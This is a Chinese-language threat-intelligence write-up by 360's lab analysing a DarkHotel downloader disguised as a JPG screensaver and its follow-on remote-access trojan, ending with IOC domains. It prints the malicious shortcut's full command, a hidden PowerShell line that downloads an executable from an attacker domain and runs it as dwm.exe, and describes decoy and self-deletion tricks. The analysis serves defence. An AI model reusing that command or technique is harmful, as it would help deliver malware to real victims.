# DarkHotel定向攻击样本分析

**Author：360天眼实验室**

0x00 引言
=======

* * *

人在做，天在看。

360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。

![](http://drops.javaweb.org/uploads/images/7f3b52d3bf81c5df88462347f0ec136b248761d6.jpg)

DarkHotel团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。

0x01 样本分析
=========

* * *

基本信息
----

样本MD5：43f3b56c1c01b007c35197c703e4d6a6  
样本大小：131,072 Bytes  
编译时间：2015-10-15 22:52:30  
文件名：DSC3013.JPG.scr

样本截图：

![](http://drops.javaweb.org/uploads/images/e3ff102146efffe339170e1f38d4aacac5015913.jpg)

详细行为
----

总体来说，样本的功能很简单，是一个典型的下载器诱饵。得到点击运行机会以后，样本会从自身释放3个图片和1个快捷方式到TEMP目录下；调用mspaint打开3个图片中的一个文件，执行TEMP目录下的快捷方式，快捷方式运行起来后会启动powershell从`http://all-microsoft-control.com/kd/f.exe`下载PE并执行。

样本首先会获取TEMP目录的路径：

![](http://drops.javaweb.org/uploads/images/85e06141c1e681a40858c8796671002ef094408c.jpg)

然后拼出4个路径：

```
%temp%\DSC3013.JPG
%temp%\DSC3014.JPG
%temp%\DSC3015.JPG
%temp%\desktop.lnk

```

![](http://drops.javaweb.org/uploads/images/40acf4ca577a3f11c42e18197a81fc843e0d151c.jpg)

会从自身文件的0x406b20的偏移处读取0xead字节的数据写入到DSC3013.JPG、DSC3014.JPG和DSC3015.JPG文件中；

![](http://drops.javaweb.org/uploads/images/f699fa89ecd2c45efc1ba0bc6ac273f17ec1ff2b.jpg)

数据为JPG图片格式文件，如图：

![](http://drops.javaweb.org/uploads/images/12186ad4336487d3114c0d47de0726ba35ded564.jpg)

图片是纯白色背景的JPG文件，因为这种纯色文件通过JPG格式的压缩后占用的空间比较小。

![](http://drops.javaweb.org/uploads/images/a2c2158bd4642665e3a091e1f6438b7eef341eff.jpg)

数据同时写入到刚才创建的3个隐藏的图片文件中，CreateFile的倒数第二个参数为2，表示该文件是隐藏的状态。

![](http://drops.javaweb.org/uploads/images/f993338f7b7e4219f0b278ee58e672745943f814.jpg)

之后会调用mspaint.exe打开DSC3013.jpg文件，因为木马样本的文件名为DSC3013.JPG.scr，而且木马样本也是图片图标，所以用图片打开DSC3013.jpg文件迷惑受害者:

![](http://drops.javaweb.org/uploads/images/291ecf679ed3584266b0807dfb1b8558096fc8da.jpg)

接下来会在同目录下再创建3个不隐藏的图片文件，并写入同样的数据：

![](http://drops.javaweb.org/uploads/images/1792df6129e370999c5255a58b55e8afbc91905f.jpg)

然后创建隐藏的desktop.lnk文件，把从文件的0x406088 处读取到的数据写入到该文件，并通过ShellExecute运行起来该快捷方式文件：

![](http://drops.javaweb.org/uploads/images/aff8de39d72fd6feeb18dacef834449c7bb49ce1.jpg)

文件的0x406088偏移处是一个快捷方式格式的文件，如图能看到快捷方式的参数信息：

![](http://drops.javaweb.org/uploads/images/0c4b7b8ff9aa44bfa6e112089f93cc814dfffdbe.jpg)

把该块数据段保存成LNK文件，命令行参数如下：

![](http://drops.javaweb.org/uploads/images/c0ae946d038fc1a2dd3e1611c5ae98a8a384e7bf.jpg)

快捷方式指向的目标为：

`%COMSPEC% /c powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://all-microsoft-control.com/kd/f.exe ','%temp%\~$ER96F.doc')&&echo f|xcopy %temp%\~$ER96F.doc %temp%\dwm.exe /H /Y&&%temp%\dwm.exe`

所以快捷方式被执行起来后，会调用powershell从`http://all-microsoft-control.com/kd/f.exe`下载到`%temp%\~$ER96F.doc`，并把该文件重命名为dwm.exe后，运行起来。

最后会在同目录下生成desktop.bat，并把“`del *.scr\r\ndel *.bat`”代码写入进去，试图删除掉该目录下所有的scr和bat后缀的文件，让目录看起来只有正常的图片文件。

![](http://drops.javaweb.org/uploads/images/5349d312c2a48b4b9e4fcf65a21c76161703a255.jpg)

远控木马
----

目前通过URL下载的dwm.exe已经失效，但从360公司海量的样本库中找到了这个文件不难：

![](http://drops.javaweb.org/uploads/images/efc965460a033827dd5dafeb4427c442779953ce.jpg)

分析显示此dwm.exe是一个使用OpenSSL协议的远控木马：

![](http://drops.javaweb.org/uploads/images/8b27481d462bd4ae566e237c5f6250162ede27d5.jpg)

样本的字符串加密存储样本里的，关键API都用解密后的字符串动态加载：.

![](http://drops.javaweb.org/uploads/images/290357c0758e3f8257638271f0078a5ddd599c7e.jpg)

sub_497036是字符串的解密函数：

![](http://drops.javaweb.org/uploads/images/94621c1b9b37b2aeaa0c4ceaf3ec9601dec0a38a.jpg)

样本会检测虚拟机、沙箱和杀软：

卡巴

![](http://drops.javaweb.org/uploads/images/5e8200cbce3573141be7bd758f50c4a8fed9c8ea.jpg)

沙箱检测：

![](http://drops.javaweb.org/uploads/images/1f33f865654d46eb8ed510689ea0d4ded5c4d506.jpg)

![](http://drops.javaweb.org/uploads/images/dff78d26a4921045c500c627c36ea7f5b34a38ee.jpg)

检测360的产品:

![](http://drops.javaweb.org/uploads/images/ff2a2901f6810056afebfebcfd51f86c4797f2ca.jpg)

检测金山和baidu的安全产品：

![](http://drops.javaweb.org/uploads/images/b3bf74a85abe4b08cfd67d45c53da138a49f0579.jpg)

检测通过后，会连接C&C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：

![](http://drops.javaweb.org/uploads/images/39916c4865bb12587e96fb64e4492ddd6d391c67.jpg)

C&C域名为：view-drama-online.com

相关分析
----

使用高级账号查询360威胁情报中心，样本涉及的域名[all-microsoft-control.com](https://www.virustotal.com/zh-cn/url/62e1dae33f17ff45a4aadbc40359940390eefbcf6da0a171ad8447f4a4767780/analysis/1463138828/)其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：

![](http://drops.javaweb.org/uploads/images/81cffc8d4dc652b8c81924ba4fb6339b76a69ac8.jpg)

域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。

虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：

![](http://drops.javaweb.org/uploads/images/55ca45c8cbd767b67e5aaf23d7c1d969111536ee.jpg)

事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。

关联组织
----

360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。

该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。

我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。

0x02 IOC
========

* * *

| 类型 | 值 |
| --- | --- |
| Downloader Domain | all-microsoft-control.com |
| C&C Domain | view-drama-online.com |